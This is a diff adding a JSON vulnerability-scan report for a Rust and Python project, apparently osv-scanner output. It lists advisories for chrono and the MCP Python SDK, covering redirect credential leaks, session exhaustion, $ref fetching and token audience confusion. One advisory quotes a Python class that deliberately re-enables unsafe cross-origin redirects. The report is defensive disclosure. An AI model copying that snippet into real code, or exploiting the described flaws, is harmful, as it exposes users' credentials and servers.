@@ -1,0 +1,1161 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/home/ubuntu/golemfactory/golem-p2p/Cargo.lock",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "chrono",
+            "version": "0.4.45",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/chrono@0.4.45"
+          },
+          "groups": [
+            {
+              "ids": [
+                "RUSTSEC-2026-0543"
+              ],
+              "aliases": [
+                "RUSTSEC-2026-0543"
+              ],
+              "max_severity": ""
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "categories": [],
+                    "cvss": null,
+                    "informational": "unmaintained",
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0543.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  },
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "chrono",
+                    "purl": "pkg:cargo/chrono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              },
+              "details": "The chrono crate is unmaintained; all versions are affected.\n\nRecommended alternatives:\n\n- [jiff](https://crates.io/crates/jiff)\n- [time](https://crates.io/crates/time)",
+              "id": "RUSTSEC-2026-0543",
+              "modified": "2026-11-17T10:15:02.344223779Z",
+              "published": "2026-09-14T12:00:00Z",
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/chrono"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2026-0543.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/chronotope/chrono/issues/1768"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "summary": "chrono is unmaintained"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "source": {
+        "path": "/home/ubuntu/golemfactory/golem-p2p/harness/semgrep-requirements.txt",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "mcp",
+            "version": "1.29.0",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/mcp@1.29.0"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5h93-6whr-6q8j"
+              ],
+              "aliases": [
+                "CVE-2026-116685",
+                "GHSA-5h93-6whr-6q8j"
+              ],
+              "max_severity": "5.9"
+            },
+            {
+              "ids": [
+                "GHSA-84m7-p3x7-pcfv"
+              ],
+              "aliases": [
+                "CVE-2026-59951",
+                "GHSA-84m7-p3x7-pcfv"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-rwrf-2pqf-9j8j"
+              ],
+              "aliases": [
+                "CVE-2026-116686",
+                "GHSA-rwrf-2pqf-9j8j"
+              ],
+              "max_severity": "6.5"
+            },
+            {
+              "ids": [
+                "GHSA-w4fh-qvv9-3v23"
+              ],
+              "aliases": [
+                "CVE-2026-116684",
+                "GHSA-w4fh-qvv9-3v23"
+              ],
+              "max_severity": "6.8"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-5h93-6whr-6q8j/GHSA-5h93-6whr-6q8j.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.2.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-5h93-6whr-6q8j/GHSA-5h93-6whr-6q8j.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.8.0"
+                        },
+                        {
+                          "fixed": "1.30.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.10.0",
+                    "1.10.1",
+                    "1.11.0",
+                    "1.12.0",
+                    "1.12.1",
+                    "1.12.2",
+                    "1.12.3",
+                    "1.12.4",
+                    "1.13.0",
+                    "1.13.1",
+                    "1.14.0",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.21.1",
+                    "1.21.2",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.23.1",
+                    "1.23.2",
+                    "1.23.3",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.27.1",
+                    "1.27.2",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.29.0",
+                    "1.29.1",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.9.0",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116685"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-200"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-27T21:05:34Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nIn affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:\n\n- custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and\n- on a `307` or `308` redirect the request body was re-sent there too.\n\nThe SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.\n\nA lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.\n\nAnyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.\n\n### Am I affected?\nYes, if your code uses the SDK as an MCP client over HTTP through any of:\n\n- `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL)\n- `streamablehttp_client` or `sse_client`\n- `ClientSessionGroup` with HTTP server parameters\n- the internal `create_mcp_http_client` helper\n\nThis includes an HTTP client you passed in yourself with `follow_redirects=True`.\n\nAffected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected:\n\n- MCP servers\n- stdio clients\n- a client you supplied with `follow_redirects` left at its default of `False`\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.\n\nThe transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.\n\nIf your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.\n\nUntil you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.\n\n\u003cdetails\u003e\n\u003csummary\u003eIf you genuinely need the old behaviour (unsupported)\u003c/summary\u003e\n\nThis restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:\n\n```python\nimport httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead\n\nclass FollowRedirectsAnyway(httpx2.AsyncClient):\n    \"\"\"Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection.\"\"\"\n\n    async def send(self, request, *, follow_redirects=False, **kwargs):\n        return await super().send(request, follow_redirects=True, **kwargs)\n\nhttp_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))\n# streamable_http_client(url, http_client=http_client)\n\n# sse_client / streamablehttp_client take a factory instead:\ndef client_factory(headers=None, timeout=None, auth=None):\n    return FollowRedirectsAnyway(headers=headers, auth=auth,\n                                 timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300))\n# sse_client(url, httpx_client_factory=client_factory)\n```\n\nThe redirect handling is then the HTTP library's own, as before the fix: a lone `Authorization` header is still dropped on cross-origin hops and `301`/`302`/`303` become `GET`. It is not something the SDK supports or tests.\n\n\u003c/details\u003e\n\n---",
+              "id": "GHSA-5h93-6whr-6q8j",
+              "modified": "2026-10-27T21:15:03.819223133Z",
+              "published": "2026-10-27T21:05:34Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-5h93-6whr-6q8j"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3397"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3448"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/2106335745563b2321b8c73fef2c12903d00aa6e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/c6762e821c527925f0b617db216d00fbd1d0bf99"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Model Context Protocol Python SDK: HTTP client transports followed cross-origin redirects carrying custom headers and bodies"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-84m7-p3x7-pcfv/GHSA-84m7-p3x7-pcfv.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.8.0"
+                        },
+                        {
+                          "fixed": "1.30.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.10.0",
+                    "1.10.1",
+                    "1.11.0",
+                    "1.12.0",
+                    "1.12.1",
+                    "1.12.2",
+                    "1.12.3",
+                    "1.12.4",
+                    "1.13.0",
+                    "1.13.1",
+                    "1.14.0",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.21.1",
+                    "1.21.2",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.23.1",
+                    "1.23.2",
+                    "1.23.3",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.27.1",
+                    "1.27.2",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.29.0",
+                    "1.29.1",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.9.0",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-84m7-p3x7-pcfv/GHSA-84m7-p3x7-pcfv.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.2.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-59951"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400",
+                  "CWE-770",
+                  "CWE-772"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-15T20:13:13Z",
+                "nvd_published_at": "2026-10-14T17:18:29Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nIn affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:\n\n- sessions did not expire;\n- a client `DELETE` ended the session but left its entry registered;\n- a session whose first request was refused stayed registered with a running task.\n\nEach session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.\n\n### Am I affected?\nYes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:\n\n- `FastMCP` (1.x)\n- `MCPServer` and `Server.streamable_http_app()` (2.x)\n- `StreamableHTTPSessionManager`\n\nAffected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected:\n\n- servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept)\n- servers using only the stdio or SSE transports\n\nAuthentication limits who can open sessions, not how many a token holder can open.\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:\n\n- a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive;\n- at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`;\n- a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.\n\nBoth settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.\n\nThis bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.\n\nIf you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.",
+              "id": "GHSA-84m7-p3x7-pcfv",
+              "modified": "2026-10-15T20:30:08.565001293Z",
+              "published": "2026-10-15T20:13:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-84m7-p3x7-pcfv"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59951"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3395"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3426"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/92120b4b0f50385af096592d7cee932fc1d994e7"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/d2290ca3434731b68ea3e2270bc06a6e6575931b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "MCP Python SDK: Unbounded Session Accumulation in StreamableHTTP Transport Enables Resource Exhaustion"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rwrf-2pqf-9j8j/GHSA-rwrf-2pqf-9j8j.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.2.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rwrf-2pqf-9j8j/GHSA-rwrf-2pqf-9j8j.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.10.0"
+                        },
+                        {
+                          "fixed": "1.30.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.10.0",
+                    "1.10.1",
+                    "1.11.0",
+                    "1.12.0",
+                    "1.12.1",
+                    "1.12.2",
+                    "1.12.3",
+                    "1.12.4",
+                    "1.13.0",
+                    "1.13.1",
+                    "1.14.0",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.21.1",
+                    "1.21.2",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.23.1",
+                    "1.23.2",
+                    "1.23.3",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.27.1",
+                    "1.27.2",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.29.0",
+                    "1.29.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116686"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-27T21:05:29Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nIn affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:\n\n- request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and\n- stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.\n\n### Am I affected?\nYes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.\n\nAffected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.\n\nUntil you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.",
+              "id": "GHSA-rwrf-2pqf-9j8j",
+              "modified": "2026-10-27T21:15:03.830660129Z",
+              "published": "2026-10-27T21:05:29Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-rwrf-2pqf-9j8j"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3394"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3396"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/5ebdfed4060d8e5b11b8e2348f86bad4d1fb8836"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/6705402e246dc4eb1fcdf4d9902b78d3c9c36e1b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Model Context Protocol Python SDK: Client fetched server-chosen $ref URLs while validating tool results against output schemas"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-w4fh-qvv9-3v23/GHSA-w4fh-qvv9-3v23.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.2.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-w4fh-qvv9-3v23/GHSA-w4fh-qvv9-3v23.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "mcp",
+                    "purl": "pkg:pypi/mcp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.10.0"
+                        },
+                        {
+                          "fixed": "1.30.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.10.0",
+                    "1.10.1",
+                    "1.11.0",
+                    "1.12.0",
+                    "1.12.1",
+                    "1.12.2",
+                    "1.12.3",
+                    "1.12.4",
+                    "1.13.0",
+                    "1.13.1",
+                    "1.14.0",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.21.1",
+                    "1.21.2",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.23.1",
+                    "1.23.2",
+                    "1.23.3",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.27.1",
+                    "1.27.2",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.29.0",
+                    "1.29.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116684"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-863"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-27T21:06:59Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nIn affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.\n\n### Am I affected?\nYes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.\n\nAffected versions:\n\n- `mcp` 1.10.0 through 1.29.1\n- `mcp` 2.0.0 through 2.1.1\n\n### Fix\nUpgrade to:\n\n- 1.x: `mcp` 1.30.0 or later\n- 2.x: `mcp` 2.2.0 or later\n\n**Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:\n\n1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server.\n2. Return the token's audience from `verify_token()` as `AccessToken.resource`.\n\nA token for another service then gets `401`. With only the first change, every request gets `401`.\n\nIf your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.\n\nIf you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.",
+              "id": "GHSA-w4fh-qvv9-3v23",
+              "modified": "2026-10-27T21:15:03.825987077Z",
+              "published": "2026-10-27T21:06:59Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-w4fh-qvv9-3v23"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3447"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/pull/3451"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/0c9136841ff092987a20700ff9c2c9789bda2f40"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/commit/8c2fa6eabacde869d75568e33b9d466b58c2f512"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "opentelemetry-api",
+            "version": "1.37.0",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/opentelemetry-api@1.37.0"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mf5v-w3w3-f6cg"
+              ],
+              "aliases": [
+                "CVE-2026-126360",
+                "GHSA-mf5v-w3w3-f6cg"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-xcq7-p3pf-p88h"
+              ],
+              "aliases": [
+                "CVE-2026-114603",
+                "GHSA-xcq7-p3pf-p88h"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 1.45.1",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-mf5v-w3w3-f6cg/GHSA-mf5v-w3w3-f6cg.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "opentelemetry-api",
+                    "purl": "pkg:pypi/opentelemetry-api"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.45.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.10b0",
+                    "0.11b0",
+                    "0.12b0",
+                    "0.13b0",
+                    "0.14b0",
+                    "0.15b0",
+                    "0.16b0",
+                    "0.16b1",
+                    "0.17b0",
+                    "0.1a0",
+                    "0.2a0",
+                    "0.3a0",
+                    "0.4a0",
+                    "0.4a1",
+                    "0.5b0",
+                    "0.6b0",
+                    "0.7b0",
+                    "0.7b1",
+                    "0.8b0",
+                    "0.9b0",
+                    "1.0.0",
+                    "1.0.0rc1",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.10a0",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.12.0",
+                    "1.12.0rc1",
+                    "1.12.0rc2",
+                    "1.13.0",
+                    "1.14.0",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.2.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.28.2",
